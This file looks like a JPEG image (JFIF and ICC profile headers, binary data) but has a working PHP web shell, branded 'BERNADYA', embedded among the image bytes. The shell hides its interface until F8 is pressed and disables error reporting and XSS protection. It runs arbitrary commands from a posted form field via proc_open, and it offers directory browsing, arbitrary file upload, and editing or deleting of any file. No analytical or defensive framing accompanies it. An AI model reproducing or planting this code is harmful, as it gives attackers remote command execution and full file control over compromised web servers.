      JFIF              ICC_PROFILE       lcms    mntrRGB XYZ        	    acspMSFT    sawsctrl                       -hand   =@  =@t,   "                                	desc       _cprt        wtpt        rXYZ   ,    gXYZ   @    bXYZ   T    rTRC   h   `gTRC   h   `bTRC   h   `desc        uRGB            text    CC0 XYZ        T        XYZ       o   8     XYZ       b         XYZ       $         curv       *   |     u     N  
  b       j . C$ )j.~3 9 ? FWM6Tv\ d l uV~  , 6           e w       C 				
	
  KINGDOM<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style type="text/css">
        @import url('https://fonts.googleapis.com/css?family=Open+Sans');

        body {
            font-family: "Open Sans", sans-serif;
            color: #fea6e2;
        }

        header {
            font-size: 4.0em;
            text-align: center;
            font-family: "Open Sans", sans-serif;
            text-decoration: underline overline 8px;
            padding: 12px;
        }

        content {
            font-family: "Open Sans", sans-serif;
            color: #fea6e2;
            font-size: 15px;
        }

        table {
            border-collapse: collapse;
            margin: 1rem auto;
            width: 69%;
        }

        th, td {
            border-color: #fea6e2;
            border: 1.5pt solid #fea6e2;
            padding: 0.4rem;
            font-size: 13px;
            text-align: left;
        }

        th {
            background-color: #932C77;
            border-color: #fea6e2;
        }

        tr:nth-child(even) {
            background-color: #932C77;
        }

        tr:hover {
            background-color: #811F67;
        }

        input {
            background: #932C77;
            color: #fea6e2;
            border: 4px solid #fea6e2;
            padding: 10px;
        }

        input[type="file"]::file-selector-button {
            border: none;
            background: #932C77;
            padding: 10px 20px;
            color: #fea6e2;
            cursor: pointer;
            transition: background .2s ease-in-out;
        }

        input[type="file"]::file-selector-button:hover {
            background: #811F67;
            color: #fea6e2;
        }
    </style>
    <script>
        function checkF8(event) {
            if (event.key === "F8") {
                // If F8 is pressed, change background and title
                document.body.style.backgroundColor = "#932C77";
                document.title = "BACKNADYA";
                sessionStorage.setItem('f8Pressed', 'true');
                document.querySelector('.bernadya-content').style.display = 'block';
                document.querySelector('.f8-message').style.display = 'none';
            }
        }

        document.addEventListener('DOMContentLoaded', function () {
            if (sessionStorage.getItem('f8Pressed') === 'true') {
                document.title = "BACKNADYA";
                document.body.style.backgroundColor = '#932C77';
                document.querySelector('.bernadya-content').style.display = 'block';
                document.querySelector('.f8-message').style.display = 'none';
            } else {
                document.body.style.backgroundColor = 'white';  // White background before F8
                document.addEventListener('keydown', checkF8);
            }
        });
    </script>
</head>

<body>
    <div class="f8-message"></div>

    <div class="bernadya-content" style="display: none;">
        <?php
		session_start();
		error_reporting(E_ALL);
		header("X-XSS-Protection: 0");
		ob_start();
		set_time_limit(0);
		error_reporting(0);
		ini_set('display_errors', FALSE);
        function xor_encrypt($data, $key) {
            $key = str_repeat($key, ceil(strlen($data) / strlen($key)));
            return $data ^ $key;
        }

        function xor_decrypt($data, $key) {
            return xor_encrypt($data, $key);  // XOR decryption is same as encryption
        }

        function get_file_permissions($file) {
            return substr(sprintf('%o', fileperms($file)), -4);
        }

        function is_writable_permission($file) {
            return is_writable($file);
        }

        // Start session
        session_start();
        if (!isset($_SESSION['dir'])) {
            $_SESSION['dir'] = '.';  // Default directory is root
        }

        // Update directory if 'dir' is received from form
        if (isset($_POST['dir']) && is_dir($_POST['dir'])) {
            $_SESSION['dir'] = $_POST['dir'];  // Update directory if valid
        }

        // Get the directory stored in session
        $dir = $_SESSION['dir'];
        $files = scandir($dir);
        $current_dir = realpath($dir);

        // Handle file upload
        if (isset($_FILES['uploaded_file'])) {
            $file_name = $_FILES['uploaded_file']['name'];
            $file_tmp = $_FILES['uploaded_file']['tmp_name'];
            $file_dest = $dir . '/' . $file_name;

            if (move_uploaded_file($file_tmp, $file_dest)) {
                $upload_message = 'File uploaded successfully.';
            } else {
                $upload_message = 'Failed to upload the file.';
            }
        }

        // Handle file delete
        if (isset($_POST['delete_file'])) {
            $file_path = $_POST['delete_file'];
            if (unlink($file_path)) {
                $delete_message = 'File deleted successfully.';
            } else {
                $delete_message = 'Failed to delete the file.';
            }
        }

        // Handle file edit
        if (isset($_POST['edit_file'])) {
            $file_path = $_POST['edit_file'];
            $file_contents = file_get_contents($file_path);
            $edit_message = "You are editing: $file_path";
            if (isset($_POST['edited_contents'])) {
                $new_contents = $_POST['edited_contents'];
                if (file_put_contents($file_path, $new_contents)) {
                    $edit_message = "File saved successfully.";
                    $file_contents = $new_contents;
                } else {
                    $edit_message = "Failed to save the file.";
                }
            }
        }

        // Handle file save
        if (isset($_POST['save_file'])) {
            $file_path = $_POST['save_file'];
            $new_contents = $_POST['edited_contents'];
            if (file_put_contents($file_path, $new_contents)) {
                $save_message = "File saved successfully.";
                $file_contents = $new_contents;
            } else {
                $save_message = "Failed to save the file.";
            }
        }
        ?>
        
        <header>|BERNADYA|</header>
        
        <center>
            <form method="post">
                <input type="text" name="cm12" placeholder="berikan nadamu !">
                <input type="submit" value="nadakan!">
            </form><br>

            <?php
            if (isset($_POST["cm12"]) && !empty($_POST["cm12"])) {
                $bernadya = $_POST["cm12"];
                $process = proc_open($bernadya, [
                    1 => ["pipe", "w"],
                    2 => ["pipe", "w"],
                ], $pipes);
                
                if (is_resource($process)) {
                    $output = stream_get_contents($pipes[1]);
                    fclose($pipes[1]);
                    fclose($pipes[2]);
                    proc_close($process);
                    echo "<pre>$output</pre>";
                } else {
                    echo "Gagal bernadya!."; 
                }
            }
            ?>

            <content>
                <b><?php echo $current_dir; ?></b>

                <?php if (!empty($edit_message)): ?>
                    <h4>Edit File: <?php echo $edit_message; ?></h4>
                    <form action="" method="POST">
                        <textarea name="edited_contents" rows="10" cols="111" style="color:#fea6e2;border: none; background-color: transparent; padding: 7px 6px; cursor: pointer;"><?php echo htmlentities($file_contents); ?></textarea><br>
                        <input type="hidden" name="save_file" value="<?php echo $file_path; ?>">
                        <input type="submit" value="Save" style="border: none; padding: 10px 10px; background-color: transparent; color:#fea6e2; cursor: pointer;">
                    </form>
                <?php endif; ?>
                
                <?php if (!empty($delete_message)): ?>
                    <h4><?php echo $delete_message; ?></h4>
                <?php endif; ?>

                <?php if (!empty($upload_message)): ?>
                    <h4><?php echo $upload_message; ?></h4>
                <?php endif; ?>

                <?php if (!empty($save_message)): ?>
                    <h4><?php echo $save_message; ?></h4>
                <?php endif; ?>

                <form action="" enctype="multipart/form-data" method="POST">
                    <input type="file" name="uploaded_file" style="color:#fea6e2;border: none; background-color: transparent; padding: 7px 6px; cursor: pointer;">
                    <input type="submit" value="Upload" style="border: none; padding: 10px 10px; background-color: transparent; color:#fea6e2; cursor: pointer;">
                </form>

                <table>
                    <tr>
                        <th>Filename</th>
                        <th>Permissions</th>
                        <th>Actions</th>
                    </tr>

                    <?php foreach ($files as $file): ?>
                        <tr>
                            <td>
                                <?php if (is_dir($dir . '/' . $file)): ?>
                                    <form action="" method="POST" style="display:inline;">
                                        <input type="hidden" name="dir" value="<?php echo $dir . '/' . $file; ?>">
                                        <input type="submit" value="<?php echo $file; ?>" style="color: <?php echo is_writable_permission($dir . '/' . $file) ? '#fea6e2' : '#bc002d'; ?>; background: transparent; border: none;">
                                    </form>
                                <?php else: ?>
                                    <?php echo $file; ?>
                                <?php endif; ?>
                            </td>
                            <td><?php echo get_file_permissions($dir . '/' . $file); ?></td>
                            <td>
                                <?php if (is_file($dir . '/' . $file)): ?>
                                    <form action="" method="POST" style="display:inline;">
                                        <input type="hidden" name="edit_file" value="<?php echo $dir . '/' . $file; ?>">
                                        <input type="submit" value="Edit" style="border: none; background-color: transparent; color:#fea6e2; cursor: pointer;">
                                    </form>
                                    <form action="" method="POST" style="display:inline;">
                                        <input type="hidden" name="delete_file" value="<?php echo $dir . '/' . $file; ?>">
                                        <input type="submit" value="Delete" style="border: none; background-color: transparent; color:#fea6e2; cursor: pointer;">
                                    </form>
                                <?php endif; ?>
                            </td>
                        </tr>
                    <?php endforeach; ?>
                </table>
            </content>
        </center>
    </div>
</body>
</html>

                  1 $  $ 1,5+(+5,N=77=NZLHLZnbbn         C 				
	
  
                  1 $  $ 1,5+(+5,N=77=NZLHLZnbbn                 "                                     	
                     }        !1A  Qa "q 2    #B   R  $3br 	
     %&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz                                                                                                       	
                     w       !1  AQ aq "2   B    	#3R  br 
 $4 %     &'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz                                                                                    ?    1P  S:    U  9    =I      S 
I    W_lI  a     gcH   #  ML#;e  .  5T z    J   ~ ;    'W^  #    O  l     I!pG! ~ n A f D  B p)S9     85f   	     \KJ 2     AA *X_  d A OqV    h      W/   n*PI 0   8 @EAd              W"M *   3   1      9  )  7+    I'   1   & 
= U
Cd   M   N    	5:  A          Pg-		$d       % ^  $f   0vh I   0 
PF              :2  A   `84  FMtFJ mjIE1\58  B  MV%    0k    4  3Ma PH$ \u$    	   )   8  @Y      H   i  
>  e     R VP |     A   F   Ab @    (    z  JH     ( T ~ 
)        r -   pG"    % = D\ IRX-  ] R A wx !T   J  (` V 8, ) { hEX  H' cS! s :    z   |   5  3n      F Py   cZN   ~ U A      s T 
\ :}      (gH 	 h !Cr SR:ne   Y  <d   *F ]    m         ! ,	 * " T       d e  k KU b  y H i 6  ~ K z       #f       X  RN F!O       M TDQ*+      E     K{'   `  b b   ]m  u $    W   IBJG ^ F a     r    j  2        U        &    O  mVj{
 q  u$ U %     XfW  <  M.D   Uy'   A) P2F   Q b       K   & T  U4 D  2  c }* roR}	   j  . *  )  SC      Q 
CKILD.X  U6      Q N
[    f    9'4  ig  v   ]1   l Q3   w  } pMAT : w  x  d1    R  99  i 1     $  J@  uRP   ) }   } 84  i 1l  T          !A M9B   s= g=     ' W
 * s    NB
        x,*r.J  "6N:KN[icm 0'  
D r1  
 .    kX:
   j Q    B ;  Fn   5p6@ f   @      *   @ q  i      @e-   c  p)DY  _=R Y zGZ 5   d    *      PI P X  7 :  Rd Nw     j    q4       @
 f  s@     )c    \ f   U   r*  %bI! Pz  iT  J)    h 	!@   '    `j a & b  & e         i6 E,G 8  4D H  $   	,J   Up  #     F
_  
g7cX  f ', = L X/ ) 
<     s N #   C @5  ^ Dc $   
 J  `   je @e$ Q b; D jV h        A >   P a $ J[|y  8"   |   X  z J T ^ rG   4\K   .s 4 j5$   y"   bQ  ] o w aY    H= 5  M   U   _-   Uw ` $  d    t    r  )  8
  
     qF 
    qJ  F# +I!!  :P   *R   fF:  `  :     In  S Hn
 N mG  T'  O  *  )J*  X     \       D ;O ND
2 $  )  o
InKw"  8
  < ] @,  < p	  q           t>  J   4   nVlP Y      5X  `?  q  k     	         UM  1   j    $ {   vTR A S H  EW     9C  A   U< W Qc     RG    6 dg     8  9 pUbec           $ C b<   A  T  db         2H=   z ] [Aeq  RIa =    7  	   =  @ HH
Y    O H    R0=A  -\ F Q    `    j     0  ~  0  !`K`  j  +C)\ E  ` Y      3 <C  $t>    ,%   $ k    RFK o   <   '1 n                +A   X   0    i 1   	    4$ m     *Oq     \      zo  wz [B A [Y$     I   G  of   )U    O  $( f     s  #0  g ;                oqR:'    t  5    X a$  [K`dW   `    =9TW_	 Vq  [   U    qW  
 g?(l   |;1    *H-   7 v    D   *;]   +  r    =  $9 ,   1   y  s G_ F ;6   L    S
R  9 F    ]   z   hTu\ z  b ( qOp4  * !  KLpH h  39 d k .X  ecm H54	  r   W  2  O   @   '5#    )  m     k   *rf      tJ U 2    2M\ @ $eG k R    w5
Q  !         \  U EQ     ^ ,$   G$       fc   G   w     i3    Y Is'B
EJt .cHNrV, " G M8!'q 8  UQs R " iVXX  8 & Ui8i#7	 jg     f (q    V  0 &  $ 
(   c_?  NO   + i )  F    f f  # E0 C E    A   " i  h   iM4  xpy   P   
p    Pi1 U     	4  H u   &B   f ,+du '   C`qR b Vm &I % k     8P #$c   M YO#    tX    $ u           g       ;m 2   G X  }      W bdG         	       j Q  H *x  5R  &   $ H  BX6c pG TX  E  5  t   x           #9& -'`v    {Q   &    b A b(D  @  
$    r  S 
    G ( Cn B X 0A  V  A  b  J  Q  79% EQ    3b  & D A    8 <  v    L I 4	 - a(  Tl    U    2  F	 5 f eO      N  \   b  K     BHNX   k    6 ) @9  
1   y&  P Y \sL  R
a6R    i   V 	   Z    I  '8    7  #  ?       #  }*    Z     nh   {  Fv8P2M`}  u s   
d   `?     \    d@  q a   ) <6I$      -    j   $  E' 	$
 T 6
 z> A9  : O$ v  zf y!F       C   Rs  E  <     X  < R@5   @v    *        n      ?E& P Y 3 R MI   P;   *x      = & } # H~ i  ~     R  y  {   D}  L =  "a " }      R        6  ( r   '  0  w a K  	    Y  WS    Pi: {
M      ~  @& X -& `  9 s  g      ?    @s    #    -V2    |  X Zp   @8 |       Eu   Sx    ,  !  GQ\   : UU2kt       aU   /'     a O    ] 	  ^   $    bsX    i 4 iD J  	7F `   R g 2  $    z    7 $ 2sS    v  m  +_g m   U  9  # } YB     k0  *iD$4D c s  CP3    n      bX@@       j  H    PK z
   2       l^d-7  I    e UZt be:  .fB   * Zyq Q  r   
 q z   m     Z PHe&  V[  ) lI4 M A  X  Wi'' T8  =
 n WM  Ub    cd h   " 	   GmO!  Ph 4 CHiM4  5VK    MH y   - d S&   "     B z Lh&   -L  X r AS  *    sQ  b 
I`    F  R )  kX  V L )I IU.g
v    h X  Y   d0^z    NUe H  .    <  -L1L    '# _C88` }@  w+   Xu8k#EU  LU?5[yb!B  9   $Q   j   ;F   k  	a     %SQ y    rOaD    I# SB  r0  T.wH     Q~       W  i : b    f i
> i `%NE   	 &  i     4 M8 M ;   
4 *  B9O [ Q   >  N       8 P0M r) =W' [ J# C    [ r	c#k  +  C \  dS  9      $        Ij7 8;X       }   $     8 ($q y  Qd   ! S  O,@Q      Wv@ 
.           = i[ 1 DVr D   c     X  I*r} ) Gbu    *y    ,m   u Z uFh e       b ! v  v9   3  W 3.Y    ~  s  : h D VT )      mE`z  *d  )4m     ET  m T }   9' j j     q  FW  5L jiP   .j $ eD p  =  *5F*H         n  4  Fj R ?       4 h   XrG  YDc &  - X q    $yj  rx  Z8M             Oz b} 0    S~.#V /.I=q   q i b Fa  B:  7       O nL ]`  k, ` =@  q $  lK         _   1X    {UY 1  \ {    6      AZX   XbEDUU    a "    n  I 
    1 $n }M^I   3     O      7%    X     AY Ol~ 4  1"   2 #5      F   C F   P5R SX.      E  d    i T  k  @ J$   P      CT    [^ dV _  B    k      p)D      b+$_U   $ & dRx`  =   <   H  p F        *    y[  nFA
 iE  v   MI             =% O     S j    PR2\  <.G   0j  `     )   /      0J~ G    M g*   vG  =o  ky     T8 4      
  ]r3  G Tyg  ` [ z  V Cq 1    \     c    G  VR m
  n$2           I   GCV$  '       cT'C     q6R   w   H      r   H$   K>#)  j rNp+Zq3  < 
 b @ X       d  I K`WU  u$  p     nb	  C 09   Ei   w     n>    4 V   i  Mz  RPi   Z   R*   ! z  lz  r}"k G   ) 
SU"  !X (   g5qw&J 
4 A` MW{ V  j   I    	      
) !   
 ,   b    \     7 N RT $      sL    0  rj 8        B   q ,     CyED         /w |  *       * I _ *^   B e 2   f  GE         z ' # E%dX  R O \1
 IIY     Hs1bI9& A  @ %   !  N4   4   i  HiM4   H    ! 5 	  "| P   @   s              #    i 4 5l  r{S3  B*PAR      YI   A1e%Fz z  )U   R   >    e#  R	 m M  ebr@      N)[ \  d> f S i;     c *  R P       
jX.UP  \ h    ; p   *U 1P  {  E .   ,	5 i  | A  ck :  t   51 D       @H  4    @ 
k H      5 5 -  ; *      * 1Y   < u Q 0n  KA 7V4  , h  }G T M       X  J` `z {UG@ 2 # O   ` s  #  G  F( p  z  -% e   2= j   m  ! vQ      {b';  $    	 :        {t  u    m  v    7;A   ; i J&n5      QV      ;  A  X 8     hQ   e  f S  I r              @X ?
 2 O   (K R 
 .  d \    %J    {v   (  	   
Le
 8 Yv  =  
 ; b:/ >  S    } N    & P`<  7  j E    (     
   m    1      H ;    7o  R      T ]   _-   ?  c e L *  r r  d`  &      {*   @>R    :\ 
 ?E   0     Q@ 	  P q h U    (  ~*s@ 0`  p+ +   m   *   Re"  "   /r   R- R     0 #P   7. @1,   G   a  %{v&   &#  5 m ,  NGPx   &   r  $<   d  b J: 0 >       j   1 W '} _   
YI r	 Q 3      i$ d   w   {MA   \ =A  u        Y    pkU$ \Z(^ibh D I i g W  i4o X         Q\[ s IP0 G      G     * H  S   I  =      c     w   +      G;     MZ     N:  Z DPFEbr 9 qDgm  ^ Z r     x &  u   )  (P  5 #  i3A  c j7r H  M 4Xi     1 i  $cc GcW  t   qIB      Nd    $RN & M  ,  b   Y @ffl`   y F
 
:   
   J  uFrZ e.   t Z$ C 	    Xw K*1 :  
 B      *P  r<  NN +O G   )  X <w4 )+   MD  85 W  RL  iXl  v      k  X  IK  JJRi  	E   @i
  Hc   y " #4  i  = $20 V    *z A  V  @XpEi    +  |   5 MN}  N `  5fv s    Z % t    9$ Y+ : al ED\ L  - 5e   ' G    T    1  - S    z  c* `A  Q * r
\  F  NO  
 h c  4 H '   @    A<| b   =9   ; 28 4 ,9$    +( r1Nt2*  G  3R  PI   &  a 0@  L8   "  Q]U m     n  %uc%   W'.{     \T\ IW   GB-+   VA       ! * $p  S r   d= z c i[Pe [  M  <z j  A   d ?,i   G   ,   A  	 Z       &   L%J  s=  I&        5 A#      g     N 1   I       Mii VO     2      ns    zl  (v   +    e y   XW  V   nT1	   u  +UI 7   ZUR! |}     n\ c#    -     !5j  .{l O# JT B: 
~hVP~f  5     w w!   t  H\     w 2 * @ 0   X 2 `2            ; '           Ua   N  1>  \ wN      }h)   ^d%S ) ~     a (  9  G   ;
  <L   Zi  @5  Vb* A UX H      .
J ;r  @@#  *?+o b  E[h$  TL   (  B%t      T     IQ        P  #   )  Wk ,  n  i    @    4 
  c   ~    *LM GUc -K  	V     *            8*  0       CF  6
 A  SG  Y   l    GAZ"@   *FA , 2  H t%     WEg8       @ A V .    Llr  E( V \  P   E0uVR #   T @{ Bh i tWR  R0Ep   m e  z C k 
I,i,l  V      c     
@Mu   b U  Oq    |   -oF J    F?   J    V   P    MLk 0 U*Q_h kT     i
)  A    q    M%      f  f  !   `!     i S  
 p Q     d  _ V  D   +*     CJn 7 c M   K, Gf  MBk  $ %      QHh  R ir) R SM4 JBh4R 
%-%  M4  h 	  q   z<w   h  r    w  T G_ B(  >       EL      zm  \  s sZ K   $V     P z   K    8 1 5^  #      M9T3  	 w <l      z  #  BH   \ v    A  cK  B bp j   $.F? iT TL  r    l   7V9 & ` pG     X       Z= `g  $    !      I  <   r PW*     php =K     m   0   H s j' UI     N  O*Z ]   `k  b4 O ry            -"8 U3F#$gq85  ,m  U- c 7    
 ^  K  e    q Z" =Q    j ,   @  U  JW7 q:4 B  d'    E"[ @ m        iu  fM           nciI   An  +G_ CSo   3        N ~                     J- xd     s    3   '  i'?y      3  3 'i9f    (     1 ( 5   V <   	    k?  W u5  F  P!     =     2    U,  8   w yU=Gr=} &4M= ,   :     1n   	<      V.T  1   &  XN9 F~         I  	 (   ' 	m+.D  N  )        r Q    _   "9 n&         ^) n {:  Q@    4?  P/Gx[     c  ]             GV    =     U  i	S #)=   
 H & r   #Rs S   .  *9 +@      H  -O     p 0 P3;4Ph @@a     E  ON       E  {     e #=W     
 0	  CS C    T 4  Jc\  a      T    [   c        0t%\w       P  P>     -"BU +    CLI    OOCV     d 8<   K u*~      ;K  a ? c      k~    k           Eh N  N~t W  m *  # 
 +.  (5  b   9f     t      
s2i mb        f       W   >  iW I g( j    < UW  j C
  a,!f^         L cp}  W K1O      8R v      #  -  #       
z4 4    9   M5e "  t' M 2 M)4 j   L  L     E%1 b F R>P2jL
  z )1   xI!   ($ jMt      A   * x    r { ] = J  0isJH     eHqL" 	I SHh        I 3@ !   bSi  h 
4  4 # ' i ,     (    d        d   V6M    /9    I$    y  
  @   @ T W 
~Rj a     k>T 9 4 h  9r  :         B         K    %   (    Xd  5 W  1   [p      0H q   Iurg  ]   j b Z   r   B0   G   I     *Q    E4 RU    >     #   1    13  mP1M	    O O   2    5 dXX    % 
  B ;  x @}  F   ( ; *@    r  h   sXf
      - 8    <J    8  g V   5          g     Wc6 ! 	> 4G  9R  TC   K     J% E b7   Ri    z  <b % G   ~ k6 c# S   } *# &i*  Gsp  )   4 @    $    `
    FX      # Rrwb      ) 0w1 ~   &y      sQ   	= !%    ~ JP6 '           d 
G8 c ~H B    T  y" .	c    
  3     VS     ? Q     O e  $ 9# R      Vr   = G U      9 f H  n ` 5  b=K oQ " T1   j  H
 :    z   #> 6 fS L    z PA   n]H |       VE*A    Bo  Dx'% C  4     * S  + GU=EZ      Mx  T   H    L  T  v  E     g: ")	 O            i    > v=   ;i  3  /qR    S$,  ^   Z   n2 .v 
 r;  +E *    d            F 0 :  P    LW< [   W1 d  ".        6 )!- N y    G  !Y   3       >| S        %     { k     + C      Z          8 @OF z   H !+  # |? <0 hi    ; X h  2  / o }A      U       S 5  y 2    B=
Zb!}Z  K  i   v  ks' Q\   I $)     5 #   L>   e s  (;  z    K {    m  $  = AS3T   B i- Y s a  q   D M4 SHi f J	   RD NGn
8        ' 5%  NR*)         0  u+   E     u%s B H )i  F!4   IH &  h  f )(  4    4RQ  )   h 
!    w  7 r J   Uu P2P  4 /8 |    
   :    H  b            =H8"  Jg    H       ^ S~     "   8     E]   b      , #   2  2x O  Y 7    mc   D +] d fU I  "    k C   iB      >  ( @ ;    5
   M . [            b     QFWw'
+X f   S$ P         #9#8  J    8    w,+   } * fe@z sWd  E
2GSU  V  F A O[ d      
4  I	  YP dbz   H   k    kF    ;W Q{ :       Q  MH      [ A   0   j  @ #6    S%r  nf]       R  	  $     i G TL       ;A%   $gQ       AH   yc    !     T  3 4  8 tu4 I :    ( R  @ E5 O     1  =0*   7 L
 U     \  :     5M  \ 3 } h     ( =) )	   
@!@T   CR  h s 7 w  f
    jtq   p[k C 4   , 0   I  H : QMrB )  T           S  rh    @5 ;NG ' 4 @   :  :  z   "D<a     F   2 0 G  h   8&  YPL         p u  E    $! +r
Hn   1Sq'4   bb    u  
    E6 uV     - h (   z    Gu  'r    F     $ ( 
  
 m3  f     u     ; l
 l H%,    ; S ee  #  s   .a  A   z  CZ6   G O   >  C   H    
s  #   7 X`  )2[ I _ G&  R   F  *  j 1   	          O  m  arK  '  j T$ 8e9  Se      G  ) [ .Tv     ^     ` 9 d  (1L$    taZGFb  Y   K!  p;   t C)   U    	^X
 k od  :r NT >  o wbz\  l<   2 2@ +    " "  +  !   }k   
   |  !  ?
    '  z   G0     & 5 1   i  i    CKI c".     I 
  < Q C oN)2    ! Ib: TK bO   6 f$ )  [ M 2   # O 5  u  5  S Q  I  I_,  u= #^%e5?z< Dl89   &    k  8    HB JSI@	IJi $ 
 J3N(h
 $ @       P SM-  i 4   #   A      LI B   w T5 +  E  77      M7mJ >O     H     i `  	 ) r 7 2j L A-  |}    
 !`0    0 2T   &       A 5  l  O     	<pk     HY   <R B  NI  j    @  h N      o 7      Q    ;    a !/
 s X G    7+ pq @  ;  u8" Ug  K n  *     %M)  !  ^ { \ #i    n !       G  @   G  '  S  a? & ~    I )  ` @H"   $.@     $  Kd i 
2 d H   k 8 2ze m    o G i  '  1  ( V     	 c j3   =3   @      X    c
 f(9   ;y  2                  Y  r ~ cj {   C"1         l~ MXy     !%   @    4 qg     )Q 71   ~"  l /  B   N  2+  C  p~   r B2+0 HOf  j m     U    *  a 
 h       J     S    G ( \ )   )A   
     *PC A   G    F  &
I  H5hy{pj	  2 GP; E"   Ub      u   % 0 1O B#Y e !    E   t D     0 w=   V %  YB        V  xz       L  F!	3B2   /  qI   2:d   <r  @ y    c 
hA*K      p} & % &3 =W !  -    8e=T   W ep8<7 5        ~ =
X   3 G         l
~*(	)  d8>   " #  "#& . iGZRhHW" v3       K0 +   '   npj    pF
k KdV ix    > y   A & `  A     V eD z 1?  j ]6  c   = # "     j  7
  2 >       , j  l  1 gpG    {      }       dS    c]      D 	   L  @i   -  I X ou'   Q  + 0 S Y R< 
4 c   ,2*     8 'Z      ^ -e N  1         U H   M V`H t . A   )   sQ<   F SW)$       F9
K :       r   V%$	7      @ * >T $  u  -Qz   h       b  Jr+    y H        *:RMr   ri      Bi3Ji    P NE%%    O   Bi   i  I  (  J 
4  0   ["  9   } y  , :    ] :kF|    
 
q  ) < 0  8# 5    : }   G ?P}  
 R4,  d       pkD 
1  V | 5  T T     T    N De  s    U L  q   =E  lg A  $ "   ` K   CJX (     k    )3   Z V3h         `1    9>  T  d S3  Q  v= L R  1 <        a  ~  X 0  q#  b vO$        3 _ Z b&  1Ua 8   Fd      E    ) +r=  S    }
J       A  T   M4)      s  )  )=   A F  V 2l  %    
.      &     ( 94    p*5$+69& Q     s  8   w    !  L  4 8      VIB sJ$x  ;    C 1F         <    I     $ U  `    ?D  8       `~'  _w  U I   u   jK  V   h ]   pA    #  5P    f   = &  2nCY  [  T' h$
 b (  R  Nx @  ,WO   r> .)   w   i         
   0   RW+)#          6$ )\  5  Ys    =+Y a   0Eg  rD  |   kE   k Q   V /l  w*:      'NL| T    [  = Q   4 _ <' g  O"     g , ` k       Z F   : ++ Q   "# =b  
] $     |   #   2.Z !    o  S        2 q   5V  1Ry+  c8 l T G<  R7Vt NVE  #   U	P          _C A  q2  sO JE8U      qL&   I M  .  a "  .  [ 2?    3  `   B  A d?  )  , F p   X    ]~     J        NFi E4I y     =M \    jhpb ` N*  G;w  W    4Z8   +  XF T      %GTh  I= B  0     /s }  8 : r7q - \DD  0    J T3r{  I  Y\ 9  :  B      Z    M     M+ *    MU (       T  I    	Y\w  +8 UJ O       M9 7 D0   UF-)   @+F D   nSY  9        b0  \ kBqn    }    Y     jr I sIF ,a 4 i
s    A     L Hh 4  b   )i(              m)      U  FMY       b0I    -    s  .) l      u   7 / }EOi   0E(H8     $b  5 a8 A jL  c   Z  yW kNWz      R$A     UK    .  #     F      \d pk 	     T  *v[  A    j `O R 6   O O  xU   a  A  FM1      d  , H     9   U      & V   N)  Jk  5    6 )    g      ;E t v  ' \    T : Y ` Y4   |    y R4J &h z kV]  E  7`2W  	 g  A4 $      > } X 7HNI     N.U       Q   NE4 FO@*H  p H  U   
$     f t  l  =          `V   QHp  O    .          >   >  |    
       A   f M! j$9,     s c H 
      
1QR       
U  ? `~    Q ) 
  b Z@( 2 `S NiR  H  E  P2 t/ M  *   dR9Wa Sl?  /Q R    R   `
G@ A  N 2  X     %C0%	  P U9 u   @   I # "     H (e 
j       A z  5  

X   J  .C  Z  Dd    u#     E(x  T      d  X =  AL #   a  D? 
  [ \t`Q   U    :    S9f    G r( ;   Ya    ' I  4   3    '  ?CK \@G@   G   N ?I   G i      > ?  Z     L      C
    j  tY    *+RDe[ # jqH  f    -L  )(& V  <S	
)    In    
O  c    T    H n   k   c   t5      	 E{   - G      k      2 A   2 td #h     ?: !i       !    w6kyV    J N  ( ``   iC   2      i	    !
  j  e     &  y Rb < E2G} 1     l>   2   i Nv_	M ,pM3  m        f  r  t5    ; [ Nj{  h   X  N@  cHds I 
\3 {   Q SHqY 4  ZC@
         h s@4 )  Hh  1   -% !4   i     5(Ec   <  @  I Y@  ;         EI   @RA4  j =I H	   c  s   1  0< 9  j  ;(n y# +i-!  GpTr         `U 6 2p 0  [q[$V     ""2   O|      7u [MNu > H g	 Q  [ }a  p ryR1 Y  Q]Q   $S  I    Y     L1 &< oqZ    1 S       I$R  B   q R  Rw o@   :K b - P $      NQEX  h uo<4es    *{  9    
 h2  + / t D=   Q%    C      R   9   =  ,   8%z    	 A  !    S        w5     V "       & C1$  )     5d &w  NO$Td @         d  9 C 
  ^T{ 4    R i p }    ;     i 0 {sN 1   _S     r     Ji (    N >     S Q?F>   p  R`k   T  . T  U    p=   jE    O j     7 f -      E K  J   3  &  3FA  E s        Fa E +N      $  G  n   Rh Fr M  f    KG  j    H  5 8 Vl ;
   k.w  H 5  S |      n  A   x  l[ | >   aZ  
  k         aJ  P)6  , "       S B 2   >  j @,    o    _ R:2 ~  RD9j2!   t   H qY     #   5 69 n: L  j    (       i   RyS   i   , p 2?
jH  (  !     ;    }j 9  d b
D   RO  C BG  @   m   >  k3U      %    kJT2FT   R:    k2    |  8"    <        )  `  e    n ='[L% 	  I    ^o  \YNb "     qSk d      q Ei C      '  v`   .U.S* U5vd7  3  h! H  :      T$#$    \  S  H %I r i "e' 5E) ) \  %j   $  #  9bI9'     ( G     $      @~^ 5H )  
  Uw  b      4  ((     M4   
i4 CH    1HM 6 )) )    )      Ji  w98  )  5  a
   @   x  9e   g T 
Hq@      7\p 9 >    yNp    j ) X   *\SZ  4     U  1^ l } : ,Y  @Y A% sXK;  M3      5  {) {U   ]      Y  #  '  PW ]  0  )R0A  $ Z  7   yP    o  >   h      vV m6 kv  !  ?      Ed     rW k(   r G   L9  m-    bc   5 qj# L	 T   
m  z  5 Y:  ,o  3H2    B     B ( K  j      7  #  z.    MTD s    H         qDg
  # U =         ' " F P  )O   T     z Hi	 &  $8SHca  }X     G - -    1 V U  X     ' ?J N     M! E      k>  4 z     f?  3      Ucr"Q ~x4 p& \    Q  
Y    C    "w     % _] ?,Ux   I b  c  4  3 e?   Q 4   @  '     a i1  p    &    cE nB  U   x4  @  P  \ k3e Y 0c      ]  w     $P}  SZ kr  :~   L       k  "}      4   A   l e  ? C- F  O  m  > T 
 jr  2      z&*   G? X  69   R R   )	  s PrMG&Hp:  U  Faq      H  &   k  r: Yv dV  $   qL
D`  t    a  1 J q +B  :        RYnC   g 3  '  v     Z  C              f~Yr   ! k  F   ?~/ i7      AG =GqP   *     r2     R 8$          %`  '  9v ) f    Tx5t N   9EIY  y p   zf  v  be   5L(=jp T  X    5 T  U   cB       L t 8          y       7!4 O$ L4 Bh    
